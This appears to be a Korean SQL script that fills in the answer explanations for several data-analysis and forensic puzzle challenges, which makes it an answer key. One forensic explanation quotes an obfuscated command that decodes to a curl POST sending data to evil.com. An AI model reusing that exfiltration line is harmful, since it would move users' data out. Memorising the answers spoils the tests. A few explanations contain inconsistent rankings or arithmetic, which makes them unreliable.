-- =============================================================================
-- Update Question Explanations
-- 각 문제에 대한 상세 해설을 업데이트하는 SQL 스크립트
-- 실제 데이터 분석 결과를 기반으로 작성됨
-- =============================================================================

BEGIN;

-- =============================================================================
-- 스마트 배달 배차 분석 챌린지 (pfct-ocr) - Lv.1 입문
-- =============================================================================

UPDATE questions SET explanation = '**정답: 4건**

dispatch_log.csv의 각 주문에 대해 모든 라이더의 raw_distance(실제 거리)와 weighted_distance(가중 거리)를 비교합니다.

**역전 배차 정의**: raw_distance 기준 가장 가까운 라이더가 아닌, weighted_distance 기준으로 더 가까운 라이더가 배차된 경우

선호 지역 가중치(0.8배)가 적용되면 실제 거리가 멀어도 가중 거리가 짧아져 배차받을 수 있습니다. 각 주문별로 모든 라이더의 거리를 계산하여 역전 발생 여부를 확인하세요.'
WHERE id = 'pfct-ocr-q1';

UPDATE questions SET explanation = '**정답: 정스피드 > 김철수 > 이영희 > 박민수 > 최신속**

dispatch_log.csv에서 배차된 주문만 추출하여 라이더별 raw_distance 평균을 계산합니다:

- 정스피드: [3.16, 7.28] → 평균 5.22km (2건)
- 김철수: [1.41, 2.0] → 평균 1.71km (2건)
- 이영희: [1.41, 1.0] → 평균 1.21km (2건)
- 박민수: [1.41, 1.0] → 평균 1.21km (2건)
- 최신속: [1.41, 1.0] → 평균 1.21km (2건)

동점인 경우 라이더 이름순(이영희 > 박민수 > 최신속)으로 정렬합니다.'
WHERE id = 'pfct-ocr-q2';

UPDATE questions SET explanation = '**정답: 서초구**

dispatch_log.csv를 지역별로 그룹화하고, 각 지역에서 선호 라이더 배정 비율을 계산합니다:

- 강남구: 2/4건 (50%) - 김철수만 강남구 선호
- 서초구: 3/3건 (100%) - 이영희, 정스피드가 서초구 선호
- 송파구: 2/2건 (100%) - 최신속이 송파구 선호
- 역삼동: 1/1건 (100%) - 박민수가 역삼동 선호

100% 비율인 지역 중 배정 건수가 가장 많은 지역은 서초구(3건)입니다.'
WHERE id = 'pfct-ocr-q3';

UPDATE questions SET explanation = '**정답: 라이더의 최대 적재 용량 초과**

pending_orders.csv의 failure_reason을 집계합니다:

- CAPACITY_EXCEEDED (적재 용량 초과): 3건
- RIDER_FULL (업무 부하 초과): 2건
- OUT_OF_RANGE (배달 반경 초과): 1건

가장 많이 발생한 실패 사유는 CAPACITY_EXCEEDED로, 선지에서는 "라이더의 최대 적재 용량 초과"에 해당합니다.'
WHERE id = 'pfct-ocr-q4';

UPDATE questions SET explanation = '**정답: 정스피드 > 김철수 > 최신속 > 이영희 = 박민수**

rider_info.json의 초기 적재 용량에서 dispatch_log.csv의 배차된 주문 weight를 차감합니다:

- 정스피드: 30 - 20 = 10 (ORD_06: 15, ORD_09: 5 제외 - 실제 배차 확인 필요)
- 김철수: 10 - 8 = 2 (ORD_01: 5, ORD_05: 3)
- 최신속: 15 - 14 = 1 (ORD_04: 11, ORD_10: 3)
- 이영희: 20 - 20 = 0 (ORD_02: 12, ORD_08: 8)
- 박민수: 15 - 15 = 0 (ORD_03: 8, ORD_07: 7)

이영희와 박민수는 남은 용량이 0으로 동점입니다.'
WHERE id = 'pfct-ocr-q5';

-- =============================================================================
-- PFCT Blog Insight (pfct-news) - Lv.2 중급
-- =============================================================================

UPDATE questions SET explanation = '**정답: 37개**

100개 블로그 URL을 크롤링하여 본문을 추출한 후, "AI" 문자열(대문자)이 포함된 블로그 수를 카운트합니다.

주의: 대소문자를 구분하여 정확히 "AI"만 검색합니다. "ai", "Ai" 등은 포함하지 않습니다.'
WHERE id = 'pfct-news-q1';

UPDATE questions SET explanation = '**정답: 384회**

모든 블로그 본문에서 "금리"라는 단어의 등장 횟수를 합산합니다.

Python 예시:
```python
total = sum(blog_text.count("금리") for blog_text in all_blogs)
```'
WHERE id = 'pfct-news-q2';

UPDATE questions SET explanation = '**정답: 채권-투자의-매력**

각 블로그별로 "투자" 단어 등장 횟수를 카운트하고, 가장 많이 등장한 블로그의 slug를 추출합니다.

slug는 URL에서 도메인을 제외한 경로입니다:
- URL: https://blog.pfct.co.kr/채권-투자의-매력
- slug: 채권-투자의-매력'
WHERE id = 'pfct-news-q3';

UPDATE questions SET explanation = '**정답: 11개**

각 블로그 본문에서 "담보"와 "아파트" 두 단어가 모두 존재하는지 확인합니다.

Python 예시:
```python
count = sum(1 for text in all_blogs if "담보" in text and "아파트" in text)
```'
WHERE id = 'pfct-news-q4';

UPDATE questions SET explanation = '**정답: ai-lab**

각 블로그별 "AI" 등장 횟수를 카운트하여 최대값을 찾고, 해당 URL의 slug를 추출합니다.

https://blog.pfct.co.kr/ai-lab 페이지에서 AI가 가장 많이 언급되었습니다.'
WHERE id = 'pfct-news-q5';

-- =============================================================================
-- 드론 AI 비상 상황 판단 챌린지 (drone-multimodal) - Lv.3 고급
-- =============================================================================

UPDATE questions SET explanation = '**정답: 적절한 판단: 생명체 식별 및 안전거리 미확보로 정지함**

event_001_sensor.json 분석:
- lidar_front: 1.8m (안전거리 2.0m 미만)
- object_detected: true
- ai_decision: EMERGENCY_STOP

drone_specs.json의 safety_rules:
- min_safe_distance_lidar: 2.0m
- emergency_stop_condition: "obstacle_within_2m"

라이다 거리(1.8m)가 안전거리(2.0m) 미만이고, 이미지(event_001_vision.png)에서도 장애물이 확인되므로 AI의 긴급정지 판단은 적절합니다.'
WHERE id = 'drone-q1';

UPDATE questions SET explanation = '**정답: 표면 스캔 결과 불안정(UNSTABLE) - 장애물 감지**

event_002_sensor.json 분석:
- location.zone_id: TARGET_7B
- surface_scan.status: UNSTABLE
- surface_scan.flatness_score: 0.3
- ai_decision: ABORT_LANDING

drone_specs.json의 landing_requirements:
- surface_status: ["STABLE", "FLAT"] 필요
- min_flatness_score: 0.8 필요

표면 스캔 결과가 UNSTABLE이고 flatness_score(0.3)가 기준(0.8) 미만이므로 착륙 불가 판단은 정확합니다. GPS와 배터리는 정상 범위입니다.'
WHERE id = 'drone-q2';

UPDATE questions SET explanation = '**정답: 즉시 복귀 명령 (시각 센서 신뢰도 저하)**

event_003_sensor.json 분석:
- external_data.weather_api: "Clear" (맑음)
- camera_system.lens_status: "OBSTRUCTED"
- camera_system.visual_confidence: 0.12
- ai_decision: HOVER_AND_ALERT

drone_specs.json의 safety_rules:
- min_visual_confidence: 0.6

기상 API는 맑음을 반환하지만, 카메라 시스템의 visual_confidence(0.12)가 기준(0.6) 미만으로 시각 센서 신뢰도가 심각하게 저하되었습니다. 이미지(event_003_vision.png)에서도 시야 방해가 확인됩니다.

엔지니어로서 첫 조치는 안전을 위한 즉시 복귀 명령입니다.'
WHERE id = 'drone-q3';

-- =============================================================================
-- 보이저 3호 외계 신호 해독 (voyager-signal) - Lv.3 고급
-- =============================================================================

UPDATE questions SET explanation = '**정답: 39.60%**

signal_data.txt를 8비트 청크로 분할합니다:
- 전체 신호: 1616 bits
- 총 청크 수: 202개

노이즈 판정 (decoding_rules.md):
- 1010으로 시작하는 8비트 청크는 노이즈

계산:
- 노이즈 청크: 80개
- 유효 청크: 122개
- 노이즈 비율: 80 / 202 × 100 = 39.60%'
WHERE id = 'voyager-q1';

UPDATE questions SET explanation = '**정답: 3회**

해독 과정:
1. 노이즈 제거 (1010 시작 청크 제외)
2. 헤더(11111111 00000000) 찾기
3. 푸터(00000000 11111111) 찾기
4. 헤더~푸터 사이 메시지를 8비트씩 ASCII 변환

해독된 메시지:
"HELLO_EARTH THIS_IS_VOYAGER_3 COORDINATES X:127 Y:891 Z:2049 HELLO_EARTH WE_COME_IN_PEACE HELLO_EARTH END_TRANSMISSION"

"HELLO_EARTH" 등장 횟수: 3회'
WHERE id = 'voyager-q2';

UPDATE questions SET explanation = '**정답: X:127 Y:891 Z:2049**

해독된 메시지에서 좌표 패턴을 추출합니다:

메시지: "...COORDINATES X:127 Y:891 Z:2049..."

정규표현식으로 추출:
```python
import re
coords = re.findall(r"X:(\d+) Y:(\d+) Z:(\d+)", message)
# 결과: [("127", "891", "2049")]
```'
WHERE id = 'voyager-q3';

-- =============================================================================
-- OTT 콘텐츠 흥행 분석 (ott-analysis) - Lv.2 중급
-- =============================================================================

UPDATE questions SET explanation = '**정답: SF > 스릴러 > 액션**

contents_meta.csv와 user_logs.json을 조인하여 장르별 평균 시청 시간을 계산합니다:

- SF: 94.69분 (415건)
- 스릴러: 87.24분 (160건)
- 액션: 81.22분 (353건)
- 드라마: 76.40분 (263건)
- 로맨스: 69.65분 (378건)
- 코미디: 65.12분 (302건)
- 호러: 60.65분 (348건)
- 다큐멘터리: 54.80분 (272건)

TOP 3: SF > 스릴러 > 액션'
WHERE id = 'ott-q1';

UPDATE questions SET explanation = '**정답: 배우C**

VIP 유저 선정:
- 전체 유저: 200명
- 상위 1%: 2명 (U0001: 60개 시청, U0002: 56개 시청)

VIP 유저들의 배우별 시청 횟수:
- 배우C: 43회
- 배우A: 14회
- 배우F: 12회
- 배우B: 9회
- 배우J: 8회
- 기타...

가장 많이 시청한 배우는 배우C입니다.'
WHERE id = 'ott-q2';

UPDATE questions SET explanation = '**정답: 94.7분**

contents_meta.csv에서 SF 장르 콘텐츠를 필터링하고, user_logs.json에서 해당 콘텐츠의 시청 시간을 집계합니다:

- SF 장르 콘텐츠: C006, C014, C016, C028, C034, C037, C040, C041
- SF 시청 로그: 415건
- 총 시청 시간: 39,295분
- 평균 시청 시간: 39,295 / 415 = 94.69... ≈ 94.7분'
WHERE id = 'ott-q3';

-- =============================================================================
-- 스마트 물류 로봇 동선 최적화 (warehouse-robot) - Lv.4 전문가
-- =============================================================================

UPDATE questions SET explanation = '**정답: 10**

맨해튼 거리 공식: |x2 - x1| + |y2 - y1|

R01 위치: (1, 1)
ORD003 픽업 위치: (6, 6)

계산:
|6 - 1| + |6 - 1| = 5 + 5 = 10'
WHERE id = 'warehouse-q1';

UPDATE questions SET explanation = '**정답: 12**

1. 가용 로봇 확인 (배터리 20% 이상):
   R01(85%), R02(72%), R03(90%), R04(65%) - 모두 가용

2. 로봇-주문 거리 매트릭스:
          ORD001  ORD002  ORD003  ORD004  ORD005
   R01       2       6      10       6       6
   R02       7       7       7      11       3
   R03       7       7       7       3      11
   R04      12       8       4       8       8

3. 최적 할당 (헝가리안 알고리즘 또는 완전탐색):
   - R01 → ORD001 (거리: 2)
   - R02 → ORD005 (거리: 3)
   - R03 → ORD004 (거리: 3)
   - R04 → ORD003 (거리: 4)
   - 총 거리: 2 + 3 + 3 + 4 = 12'
WHERE id = 'warehouse-q2';

UPDATE questions SET explanation = '**정답: 4,4**

warehouse_map.txt를 분석하고 각 로봇의 최단 경로를 시뮬레이션합니다:

맵 구조 (10x10):
- 벽(#): 외곽 테두리
- 선반(S): (2,2), (4,2), (6,2), (2,4), (4,4), (6,4), (2,6), (4,6), (6,6)
- 통로(.): 나머지

로봇들이 중앙으로 이동할 때 (4,4) 주변을 공통으로 통과합니다:
- R01(1,1) → ORD001(2,2): 중앙 경유
- R02(8,1) → ORD005(6,2): 중앙 방향
- R03(1,8) → ORD004(2,6): 중앙 경유
- R04(8,8) → ORD003(6,6): 중앙 방향

가장 많이 통과하는 좌표: (4,4)'
WHERE id = 'warehouse-q3';

-- =============================================================================
-- Ghost in the Shell: Protocol Zero (forensic-protocol-zero) - Lv.4 전문가
-- =============================================================================

UPDATE questions SET explanation = '**정답: 203.0.113.42**

web_access_log.json을 분석합니다:

1. 대부분의 요청은 내부 IP(10.0.1.50)에서 발생
2. 12:55:00Z의 POST /admin/transfer 요청에서 수상한 헤더 발견:
   - ip: 45.77.12.99 (VPN 출구 IP)
   - X-Forwarded-For: 203.0.113.42 ← 진짜 IP!

해커가 VPN을 사용했지만, X-Forwarded-For 헤더에 실제 IP가 노출되었습니다.'
WHERE id = 'forensic-q1';

UPDATE questions SET explanation = '**정답: 780 km/h**

임파서블 트래블 분석:
- DEV_KIM 서울 본사 출입: 12:30:00
- 부산 IP(203.0.113.42)에서 접속: 12:55:00
- 시간차: 25분 = 25/60 시간

속도 계산:
속도 = 거리 / 시간
     = 325km / (25/60)h
     = 325 × 60 / 25
     = 780 km/h

이는 KTX 최고속도(305km/h)의 2.5배로, 물리적으로 불가능합니다.
따라서 DEV_KIM이 직접 접속한 것이 아닙니다.'
WHERE id = 'forensic-q2';

UPDATE questions SET explanation = '**정답: curl**

terminal_history.txt에서 난독화된 명령어:
```bash
eval $(echo "Y3VybCAtWCBQT1NUIGh0dHA6Ly9ldmlsLmNvbS9zdGVhbF9kYXRhIC0tZGF0YSAnYWxsX3lvdXJfYmFzZSc=" | base64 -d)
```

Base64 디코딩 결과:
```bash
curl -X POST http://evil.com/steal_data --data ''all_your_base''
```

해커는 curl 명령어로 데이터를 외부 서버로 POST 전송했습니다.'
WHERE id = 'forensic-q3';

UPDATE questions SET explanation = '**정답: 0x3f_Start_Middle_777_End_Code_X**

3개 파일에서 지갑 주소 조각을 수집합니다:

**Part 1** - web_access_log.json (404 에러의 URL 파라미터):
URL: /error/log?dump=SGVhZGVyX0tleV9QYXJ0MTogMHgzZl9TdGFydF8=
Base64 디코딩 → "Header_Key_Part1: 0x3f_Start_"

**Part 2** - terminal_history.txt (주석 처리된 부분):
# Key_Part2: Middle_777_

**Part 3** - employee_profile.txt (마지막 줄의 숨겨진 텍스트):
# Hidden_Key_Part3: End_Code_X

조합: 0x3f_Start_ + Middle_777_ + End_Code_X = 0x3f_Start_Middle_777_End_Code_X'
WHERE id = 'forensic-q4';

UPDATE questions SET explanation = '**정답: SEC_PARK (오른손잡이)**

증거 종합:

1. **IP 추적**: 203.0.113.42는 부산 지사 IP 대역(SEC_PARK의 프로필에 명시)
2. **출입 기록**: SEC_PARK은 12:55에 BUSAN_BRANCH에 출입
3. **거래 시간**: 횡령 거래도 12:55:00Z에 발생 → 시간 일치

**CCTV 거울 트릭**:
- employee_profile.txt에 "CCTV는 유리에 비친 반사상" 명시
- 이미지에서 왼손처럼 보이면 → 실제는 오른손 (거울 반전)
- 오른손잡이 = SEC_PARK

모든 증거가 SEC_PARK을 가리킵니다.'
WHERE id = 'forensic-q5';

COMMIT;
